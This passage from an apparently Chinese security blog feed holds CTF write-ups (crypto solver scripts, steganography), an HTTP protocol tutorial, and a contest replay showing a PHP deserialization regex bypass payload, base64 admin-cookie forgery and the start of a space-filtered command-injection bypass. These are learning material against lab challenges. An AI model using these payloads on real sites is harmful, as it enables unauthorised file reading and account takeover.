src="https://s2.ax1x.com/2019/01/25/km4Jc4.png" alt="km4Jc4.png"></p><p><a href="https://imgchr.com/i/km4V1g" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/01/25/km4V1g.md.png" alt="km4V1g.md.png"></a></p><p>在线解密一次以后再解一次即可得到flag：</p><p><a href="https://imgchr.com/i/km4buj" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/01/25/km4buj.md.png" alt="km4buj.md.png"></a></p><p>这就是双重DES……</p><h3 id="古典密码签到"><a href="#古典密码签到" class="headerlink" title="古典密码签到"></a>古典密码签到</h3><p>也是解的很暴躁的一题，基本就是大家一开始都是base32出来就不知道那是什么玩意了……</p><p><a href="https://imgchr.com/i/km5n2D" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/01/25/km5n2D.md.png" alt="km5n2D.md.png"></a></p><p>翻看各种大佬的博客总结古典密码都没有这种奇怪的符号……直到队友解出来的那一刻我都是懵逼的(SourceNB)，放上解题脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">s=<span class="string">"LZYGQ326N5QXMYAKORNG42TABJ2FUWS2MNRWG6A="</span></span><br><span class="line">c=base64.b32decode(s)</span><br><span class="line"><span class="keyword">print</span> c</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">128</span>):</span><br><span class="line">    ans=<span class="string">""</span></span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> c:</span><br><span class="line">        ans+=chr((ord(x)+i)%<span class="number">128</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">'ctf'</span> <span class="keyword">in</span> ans:</span><br><span class="line">        <span class="keyword">print</span> ans</span><br></pre></td></tr></table></figure><p>在ASCII码内凯撒爆破即可：</p><p><img src="https://s2.ax1x.com/2019/01/25/km5oIx.png" alt="km5oIx.png"></p><p>慢着…这16进制是什么鬼……大胆猜测是easy_soeasy__hhh，填入果然没错……</p><p>总的来说做这两题的心情就是可以狂扁出题人小朋友了……</p><p><a href="https://imgchr.com/i/km5zdI" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/01/25/km5zdI.md.png" alt="km5zdI.md.png"></a></p><h3 id="easyrsa"><a href="#easyrsa" class="headerlink" title="easyrsa"></a>easyrsa</h3><p>这题终于不是前面两题那么让人流泪了……，n和c里只出现了12个字符猜测是12进制；</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">n=36004b9A985A624479A4891b16130722A5A7453989bA61737A226368504A5689381236451796A445824b5A516b176b40135935b0b8999046154359b0560537100289b9795129505b461542A4897A56561529A705135AA772507bb3172b03b3425A99224b68b45b801459b29A070bAb9408761b4A70b905308772472934486924bA17013A2A801041A05178b0488AA5</span><br><span class="line">e=5</span><br><span class="line">c=411A016A671768793b5AAbA4A043001A468b8A9A6122290461266393181b021812b6AAbAA1b57161bAA300321174154862338b0098249626A93116b34752540987309A08520bb6780804b5679144173Ab7301b49322587504A75A7A2445928A07A650bb6076bA3412b1375205336b43A11A1510A22893b937065</span><br></pre></td></tr></table></figure><p>给出以下信息，<code>e=5</code>，猜测是低指数攻击，上解题脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">twl_to_dec</span><span class="params">(twl)</span>:</span></span><br><span class="line">ans=<span class="number">0</span></span><br><span class="line">l=len(twl)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(l):</span><br><span class="line"><span class="keyword">if</span> twl[i]==<span class="string">'A'</span>:</span><br><span class="line">temp=<span class="number">10</span></span><br><span class="line"><span class="keyword">elif</span> twl[i]==<span class="string">'b'</span>:</span><br><span class="line">temp=<span class="number">11</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">temp=int(twl[i],<span class="number">10</span>)</span><br><span class="line">ans+=temp*pow(<span class="number">12</span>,l-i<span class="number">-1</span>)</span><br><span class="line"><span class="keyword">return</span> ans</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">small_msg</span><span class="params">(c,n,e)</span>:</span></span><br><span class="line">i=<span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    <span class="keyword">if</span>(gmpy2.iroot(c+i*n, e)[<span class="number">1</span>] == <span class="number">1</span>):</span><br><span class="line">        x = gmpy2.iroot(c+i*n, e)[<span class="number">0</span>]</span><br><span class="line">        <span class="keyword">print</span> hex(x)[<span class="number">2</span>:].decode(<span class="string">'hex'</span>)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">i += <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">n=<span class="string">"36004b9A985A624479A4891b16130722A5A7453989bA61737A226368504A5689381236451796A445824b5A516b176b40135935b0b8999046154359b0560537100289b9795129505b461542A4897A56561529A705135AA772507bb3172b03b3425A99224b68b45b801459b29A070bAb9408761b4A70b905308772472934486924bA17013A2A801041A05178b0488AA5"</span></span><br><span class="line">c=<span class="string">"411A016A671768793b5AAbA4A043001A468b8A9A6122290461266393181b021812b6AAbAA1b57161bAA300321174154862338b0098249626A93116b34752540987309A08520bb6780804b5679144173Ab7301b49322587504A75A7A2445928A07A650bb6076bA3412b1375205336b43A11A1510A22893b937065"</span></span><br><span class="line">e=<span class="number">5</span></span><br><span class="line">n=twl_to_dec(n)</span><br><span class="line">c=twl_to_dec(c)</span><br><span class="line">small_msg(c,n,e)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">main()</span><br></pre></td></tr></table></figure><p>12进制转化为 10进制以后直接进行小公钥指数攻击即可，得到flag：</p><p><img src="https://s2.ax1x.com/2019/01/28/kM2DiV.png" alt="kM2DiV.png"></p><p><strong>友情提示：</strong>自己写的进制转换虽然丑，but肯定比网上在线转换靠谱（微笑.jpg）</p><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="Misc签到"><a href="#Misc签到" class="headerlink" title="Misc签到"></a>Misc签到</h3><p>得到盲文图片如下，直接对应盲文表解出flag内容为：<code>BAIND</code>，将A换为1，加上flag提交即可；</p><p><img src="https://s2.ax1x.com/2019/01/28/kMBHfJ.png" alt="kMBHfJ.png"></p><h3 id="BXS图标真好看"><a href="#BXS图标真好看" class="headerlink" title="BXS图标真好看"></a>BXS图标真好看</h3><p>打开是个txt文件，查看内容发现<code>IDHR</code>关键字，猜测是png图片，直接改掉后缀得到一张图片；</p><p><img src="https://s2.ax1x.com/2019/01/28/kMDah4.png" alt="kMDah4.png"></p><p>发现flag相关内容，猜测是凯撒移位，但发现前面有8位，果断推翻猜想，继续猜测是栅栏密码，果然得到flag；</p><p><img src="https://s2.ax1x.com/2019/01/28/kMDvgs.png" alt="kMDvgs.png"></p><h3 id="base全家桶了解一下"><a href="#base全家桶了解一下" class="headerlink" title="base全家桶了解一下"></a>base全家桶了解一下</h3><p>nctf遇到过差不多的题，没什么难度；</p><p>解密脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">s=<span class="string">"R1kzRE1RWldHRTNET04yQ0dVM1RNTkpXSU0zREdNWlFHWkNETU5KVklZM1RJTVpRR01ZREtSUldHTTNUS05TRUc0MkRNTVpYR1EzRE1OMkU="</span></span><br><span class="line">c=base64.b64decode(s)</span><br><span class="line"><span class="keyword">print</span> c</span><br><span class="line">d=base64.b32decode(c)</span><br><span class="line"><span class="keyword">print</span> d</span><br><span class="line">e=base64.b16decode(d)</span><br><span class="line"><span class="keyword">print</span> e</span><br></pre></td></tr></table></figure><p><a href="https://imgchr.com/i/kMroRJ" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/01/28/kMroRJ.md.png" alt="kMroRJ.md.png"></a></p><h3 id="起床改error啦"><a href="#起床改error啦" class="headerlink" title="起床改error啦"></a>起床改error啦</h3><p>唯一做到的Misc……队友Source太给力……拿到手是个png图片</p><p><img src="https://s2.ax1x.com/2019/01/28/kMsCQA.jpg" alt="kMsCQA.jpg"></p><p>丢进十六进制编辑器，发现猫腻，有zip文件头和flag信息；</p><p><img src="https://s2.ax1x.com/2019/01/28/kMsAdf.png" alt="kMsAdf.png"></p><p>扒下来另存为zip，解压得到flag.doc，但是里面没有flag；</p><p><img src="https://s2.ax1x.com/2019/01/28/kMs3wV.png" alt="kMs3wV.png"></p><p>提示直接告诉是doc隐写，那就显示隐藏文字即可，得到flag；</p><p><img src="https://s2.ax1x.com/2019/01/28/kMs2SH.png" alt="kMs2SH.png"></p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;毕竟是萌新，能有校赛打已经很开心了，下面放上本次双月赛的部分题解；
    
    </summary>
    
      <category term="Writeup" scheme="https://gardenia30.top/categories/Writeup/"/>
    
    
      <category term="Web" scheme="https://gardenia30.top/tags/Web/"/>
    
      <category term="Writeup" scheme="https://gardenia30.top/tags/Writeup/"/>
    
      <category term="CTF" scheme="https://gardenia30.top/tags/CTF/"/>
    
      <category term="Crypto" scheme="https://gardenia30.top/tags/Crypto/"/>
    
      <category term="Misc" scheme="https://gardenia30.top/tags/Misc/"/>
    
  </entry>
  
  <entry>
    <title>深入了解HTTP请求流程</title>
    <link href="https://gardenia30.top/2019/01/22/%E6%B7%B1%E5%85%A5%E4%BA%86%E8%A7%A3HTTP%E8%AF%B7%E6%B1%82%E6%B5%81%E7%A8%8B/"/>
    <id>https://gardenia30.top/2019/01/22/深入了解HTTP请求流程/</id>
    <published>2019-01-22T11:08:45.000Z</published>
    <updated>2019-02-19T12:25:37.192Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>你知道平时输入一个网址，简单地按下回车以后，客户端和服务端是怎样复杂运作的吗？<a id="more"></a></p><h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><h2 id="简述"><a href="#简述" class="headerlink" title="简述"></a>简述</h2><p>HTTP(HyperText Transfer)即超文本传输协议，是一种详细规定了浏览器和万维网服务器之间相互通信的规则，是万维网交换信息的基础，它允许将HTML文档从Web服务器传送到Web浏览器；</p><h2 id="发起HTTP请求"><a href="#发起HTTP请求" class="headerlink" title="发起HTTP请求"></a>发起HTTP请求</h2><p>问题很简单，也就是在浏览器地址栏中输入URL(统一资源定位符，简称网址)按下回车就已经发起了这个HTTP请求，很快就会看到请求的返回结果；</p><p>URL的标准格式：<code>协议://服务器IP [:端口]/路径/[?查询]</code></p><p>借助浏览器就可以快速发起一次HTTP请求，当然也可以借助其他工具，例如Linux中的curl命令；</p><h2 id="HTTP协议详解"><a href="#HTTP协议详解" class="headerlink" title="HTTP协议详解"></a>HTTP协议详解</h2><p>HTTP协议是一种无状态的协议，无状态是指Web浏览器与Web服务器之间不需要建立持久的连接，一个客户端发出请求，然后服务器返回响应，连接就被关闭了，服务器不保留连接的有关信息；HTTP请求只能由客户端发起，而服务器不能主动向客户端发送数据；</p><h3 id="HTTP请求与响应"><a href="#HTTP请求与响应" class="headerlink" title="HTTP请求与响应"></a>HTTP请求与响应</h3><h4 id="HTTP请求"><a href="#HTTP请求" class="headerlink" title="HTTP请求"></a>HTTP请求</h4><p>HTTP请求包括3部分，分别是请求行(请求方法)，请求头(消息报头)，请求正文；</p><p>如下为本地测试的结果：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">POST /test/a2.php HTTP/1.1                //请求行</span><br><span class="line">Host: 127.0.0.1                           //请求头</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:64.0) Gecko/20100101 Firefox/64.0</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">content-type: application/x-www-form-urlencoded</span><br><span class="line">cache: no-cache</span><br><span class="line">origin: moz-extension://ea79062d-25c1-4d61-82fd-7b0d239923a7</span><br><span class="line">Content-Length: 8</span><br><span class="line">Connection: keep-alive</span><br><span class="line">      //空白行，代表请求头结束</span><br><span class="line">b=123456                                  //请求正文</span><br></pre></td></tr></table></figure><p><strong>请求行：</strong>由三部分组成，第一部分<code>POST</code>为请求方式，第二部分<code>/test/a2.php</code>为该域名的目录下的文件，第三部分为<code>HTTP/1.1</code>说明的是HTTP的版本；</p><p><strong>请求头：</strong><code>HOST</code>为请求的主机地址，<code>User-Agent</code>为浏览器标识，其他内容有待以后学习中更新；</p><p><strong>请求正文：</strong>请求正文是可选的，最常出现在POST方法中；</p><h4 id="HTTP响应"><a href="#HTTP响应" class="headerlink" title="HTTP响应"></a>HTTP响应</h4><p>与HTTP请求对应，HTTP响应也是由3部分组成，分别是响应行，响应头，响应正文；</p><p>下面为上述本地测试的响应部分：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 200 OK                            //响应行</span><br><span class="line">Date: Tue, 22 Jan 2019 07:55:57 GMT        //响应头</span><br><span class="line">Server: Apache/2.4.23 (Win32) OpenSSL/1.0.2j PHP/5.5.38</span><br><span class="line">X-Powered-By: PHP/5.5.38</span><br><span class="line">Content-Length: 19</span><br><span class="line">Keep-Alive: timeout=5, max=100</span><br><span class="line">Connection: Keep-Alive</span><br><span class="line">Content-Type: text/html</span><br><span class="line"></span><br><span class="line">string(6) &quot;123456&quot;                         //响应正文</span><br></pre></td></tr></table></figure><p><strong>响应行：</strong>有HTTP版本，状态码，以及消息“OK”；</p><p><strong>响应头：</strong>由服务器向客户端发送；</p><p><strong>响应正文：</strong>是服务器向客户端发送的HTML数据；</p><h3 id="HTTP请求方法"><a href="#HTTP请求方法" class="headerlink" title="HTTP请求方法"></a>HTTP请求方法</h3><ol><li><p>GET</p><p>GET方法用于获取请求页面的指定信息。如果请求资源为动态脚本（not HTML），那么返回的文本就是Web容器解析后的HTML源代码，而不是源文件；</p></li><li><p>POST</p><p>和GET方式相似，最大区别就是GET方法没有请求内容，而POST是有请求内容的。POST请求最多用于向服务器发送大量数据，GET虽然也可以，但是有长度限制，并且GET请求会将发送的数据显示在浏览器端，而POST不会；</p></li><li><p>HEAD</p><p>HEAD除了服务器不能在响应里返回消息主体外，其他与GET相同，此方法常用于测试超文本链接的有效性，可访问性和最近的改变。只用于测试资源是否存在，而不用返回消息主体；速度最快；</p></li><li><p>PUT</p><p>用于请求服务器把请求中的实体存储在请求资源下</p></li><li><p>DELETE</p><p>用于请求源服务器删除请求的指定资源</p></li><li><p>TRACE</p></li><li><p>CONNECT</p></li><li><p>OPTIONS</p></li></ol><h3 id="HTTP状态码"><a href="#HTTP状态码" class="headerlink" title="HTTP状态码"></a>HTTP状态码</h3><p>客户端发出HTTP请求，服务器端接收后，会向客户端发送响应信息，HTTP响应的第一行最重要的就是HTTP状态码；状态码由三位数字组成，第一位数字定义了响应的类别，且只有一下5种</p><ul><li>1xx：信息提示，表示请求被成功接收，继续处理，范围：100~101；</li><li>2xx：成功，服务器成功处理了请求，范围：200~206；</li><li>3xx：重定向，用于告诉浏览器客户端，它们的访问资源已经被移动，并告诉客户端新的资源地址位置，范围：300~305；</li><li>4xx：客户端错误代码，客户端发送了一些服务器无法处理的东西，范围：400~415；</li><li>5xx：Web服务器自身出现了错误，用于描述服务器的内部错误，范围：500~505；</li></ul><p>常见的状态码：</p><ul><li><p>200：客户端请求成功；</p></li><li><p>302：重定向；</p></li><li><p>404：请求资源不存在；</p></li><li><p>400：客户端请求有语法错误；</p></li><li><p>401：请求未经授权；</p></li><li><p>403：服务器收到请求但是拒绝提供服务；</p></li><li><p>500：服务器内部错误；</p></li><li><p>503：服务器当前无法处理客户端的请求，一段时间以后可能恢复正常；</p></li></ul><h3 id="HTTP消息"><a href="#HTTP消息" class="headerlink" title="HTTP消息"></a>HTTP消息</h3><p>又称HTTP头（HTTP header），由四部分组成：请求头，响应头，普通头，实体头；</p><ol><li><p>请求头：</p><ol><li><p>Host</p><p>主要用于指定被请求资源的Internet主机和端口号；</p></li><li><p>User-Agent</p><p>允许客户端将自己的操作系统，浏览器和其他属性告诉服务器；</p></li><li><p>Referer</p><p>Referer包含一个URL，代表当前访问URL的上一个URL；</p></li><li><p>Cookie</p><p>一段文本用来表示请求者身份等；</p></li><li><p>Range</p><p>可以请求实体的部分内容，多线程下载时会用到这个请求头；</p></li><li><p>x-forward-for</p><p>即XXF头，代表请求端的IP，可以有多个，中间以逗号隔开；</p></li><li><p>Accept</p><p>用于指定客户端接收哪些MIME类型的信息；</p></li><li><p>Accept-Charset</p><p>用于指定客户端接收的字符集</p></li></ol></li><li><p>响应头</p><ol><li><p>Server</p><p>服务器所使用的Web服务器的名称；</p></li><li><p>Set-Cookie</p><p>向客户端设置Cookie；</p></li></ol></li><li><p>实体头</p><ol><li><p>Content-Type</p><p>实体头用于向接收方指示实体的介质类型；</p></li><li><p>Content-Length</p><p>指明实体正文的长度；</p></li></ol></li></ol><h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>学无止境，身为萌新，没有学到的知识还有很多很多，希望在日后的学习中这个归纳对我会有所帮助。</p><hr><p>参考书籍：《Web安全深度剖析》《计算机网络》</p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;你知道平时输入一个网址，简单地按下回车以后，客户端和服务端是怎样复杂运作的吗？
    
    </summary>
    
      <category term="Web安全学习笔记" scheme="https://gardenia30.top/categories/Web%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    
      <category term="Web" scheme="https://gardenia30.top/tags/Web/"/>
    
      <category term="HTTP" scheme="https://gardenia30.top/tags/HTTP/"/>
    
  </entry>
  
  <entry>
    <title>2018安恒杯12月月赛复现</title>
    <link href="https://gardenia30.top/2019/01/19/%E5%AE%89%E6%81%9212%E6%9C%88%E6%9C%88%E8%B5%9B/"/>
    <id>https://gardenia30.top/2019/01/19/安恒12月月赛/</id>
    <published>2019-01-19T09:07:40.000Z</published>
    <updated>2019-01-19T15:00:46.626Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>萌新因为种种原因没有做安恒12月的月赛题，正巧这几天发现复现，又学到了新知识！<a id="more"></a></p><h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="easy"><a href="#easy" class="headerlink" title="easy"></a>easy</h3><p>题目<code>index.php</code>给出源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line">@error_reporting(<span class="number">1</span>); </span><br><span class="line"><span class="keyword">include</span> <span class="string">'flag.php'</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">baby</span> </span></span><br><span class="line"><span class="class"></span>&#123;   </span><br><span class="line">    <span class="keyword">public</span> $file;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span>      </span></span><br><span class="line"><span class="function">    </span>&#123;          </span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;file)) </span><br><span class="line">        &#123;</span><br><span class="line">            $filename = <span class="string">"./&#123;$this-&gt;file&#125;"</span>;        </span><br><span class="line">            <span class="keyword">if</span> (file_get_contents($filename))         </span><br><span class="line">            &#123;              </span><br><span class="line">                <span class="keyword">return</span> file_get_contents($filename); </span><br><span class="line">            &#125; </span><br><span class="line">        &#125;     </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'data'</span>]))  </span><br><span class="line">&#123; </span><br><span class="line">    $data = $_GET[<span class="string">'data'</span>];</span><br><span class="line">    preg_match(<span class="string">'/[oc]:\d+:/i'</span>,$data,$matches);</span><br><span class="line">    <span class="keyword">if</span>(count($matches))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'Hacker!'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        $good = unserialize($data);</span><br><span class="line">        <span class="keyword">echo</span> $good;</span><br><span class="line">    &#125;     </span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">else</span> </span><br><span class="line">&#123; </span><br><span class="line">    highlight_file(<span class="string">"./index.php"</span>); </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>这题一开始没看懂到底是啥意思，一开始定义了一个baby类，然后在下面完全没有用到有关这个类的任何东西，所以身为萌新的我一脸蒙圈……后来经过仔细地阅读代码，大量的查阅资料，现了其中的猫腻……</p><p><strong>分析：</strong></p><ol><li><p>代码一开始包含文件<code>flag.php</code>；</p></li><li><p>然后定义了一个类，类成员变量<code>$file</code>,重写<code>__toString()</code>方法，这个方法就是将以<code>$filename</code>为文件名的文件输出；</p></li><li><p>接着对<code>data</code>进行正则匹配<code>preg_match(&#39;/[oc]:\d+:/i&#39;,$data,$matches)</code>，匹配结果放入<code>$matches</code>，匹配成功就<code>die(&#39;Hacker!&#39;)</code>，不成功就对输入的<code>$data</code>进行反序列化并输出；</p></li></ol><p><strong>解题方法：</strong></p><p>其实这个题理解了以后就不难了，目标是输出<code>flag.php</code>的内容，所以构造的<code>data</code>肯定也与包含的文件名相关；</p><p>先对<code>flag.php</code>进行序列化并输出，脚本如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">baby</span> </span></span><br><span class="line"><span class="class"></span>&#123;   </span><br><span class="line">    <span class="keyword">public</span> $file;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span>      </span></span><br><span class="line"><span class="function">    </span>&#123;          </span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;file)) </span><br><span class="line">        &#123;</span><br><span class="line">            $filename = <span class="string">"./&#123;$this-&gt;file&#125;"</span>;        </span><br><span class="line">            <span class="keyword">if</span> (file_get_contents($filename))         </span><br><span class="line">            &#123;              </span><br><span class="line">                <span class="keyword">return</span> file_get_contents($filename); </span><br><span class="line">            &#125; </span><br><span class="line">        &#125;     </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line">$a=<span class="keyword">new</span> baby();</span><br><span class="line">$a-&gt;file=<span class="string">'flag.php'</span>;</span><br><span class="line">$b=serialize($a);</span><br><span class="line"><span class="keyword">echo</span>($b);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><strong><em>测试结果输出：</em></strong><code>O:4:&quot;baby&quot;:1:{s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;}</code>直接GET这个值会匹配正则表达式，所以就要想办法绕过；</p><p><strong>绕过方法</strong>：该函数设计的初衷是为了不让<code>Object</code>类型被反序列化，然而正则不够严谨，我们可以在对象长度前加一个<code>+</code>号，即<code>O:4 -&gt; O:+4</code>，即可绕过这层检测，从而使得我们可控的数据传入<code>unserialize</code>函数；</p><p>构造如下：<code>O:+4:&quot;baby&quot;:1:{s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;}</code></p><p>将这个字符传入<code>unserialize</code>函数以后会直接反序列化出一个<code>baby</code>的对象<code>$good</code>，<code>$good-&gt;file</code>是<code>flag.php</code>，反序列化后会直接默认调用魔术方法<code>__toString()</code>输出文件内容；</p><p>所以归根结底还是一个正则绕过+反序列化的问题，将构造的<code>data</code>经过URL编码以后GET进去即可得到flag；(不知道为啥直接在浏览器里传参没用，所以就用bp构造GET了一下)</p><p><code>payload:?data=O%3A%2b4%3A%22baby%22%3A1%3A%7Bs%3A4%3A%22file%22%3Bs%3A8%3A%22flag.php%22%3B%7D</code></p><p><img src="https://s2.ax1x.com/2019/01/19/kCMhtS.png" alt="kCMhtS.png"></p><p>反序列化漏洞参考链接：</p><p><a href="https://www.freebuf.com/articles/web/167721.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/web/167721.html</a></p><p><a href="https://xz.aliyun.com/t/3017" target="_blank" rel="noopener">https://xz.aliyun.com/t/3017</a></p><p><a href="https://paper.seebug.org/39/" target="_blank" rel="noopener">https://paper.seebug.org/39/</a></p><h3 id="easyweb2"><a href="#easyweb2" class="headerlink" title="easyweb2"></a>easyweb2</h3><p>这题拿到以后没有切入点…老办法…扫一波目录，发现<code>admin.php</code>和<code>config.php</code></p><p><img src="https://s2.ax1x.com/2019/01/19/kCJwDJ.png" alt="kCJwDJ.png"></p><p>进入<code>admin.php</code>发现<code>You are not admin…</code>，基本定下思路就是伪造管理员身份登录，查看请求头中的信息发现cookie的<code>user=dXNlcg%3D%3D</code>推测为base64编码，解码为<code>user</code></p><p><img src="https://s2.ax1x.com/2019/01/19/kCJIUI.png" alt="kCJIUI.png"></p><p>要求以管理员身份登录，于是伪造<code>user</code>为<code>admin</code>，base64编码一下修改cookie的值为<code>YWRtaW4=</code>；刷新网页后发现进入了如下界面；</p><p><img src="https://s2.ax1x.com/2019/01/19/kCYCGV.png" alt="kCYCGV.png"></p><p>输入<code>ls</code>发现回显；</p><p><img src="https://s2.ax1x.com/2019/01/19/kCYeaR.png" alt="kCYeaR.png"></p><p>输入<code>ls /</code>想查看根目录报错<code>error</code>，输入<code>cat admin.php</code>报错，设想是过滤了空格，Google了一下空格的绕过方式如下：<strong>IFS的默认值为：空白（包括：空格，tab, 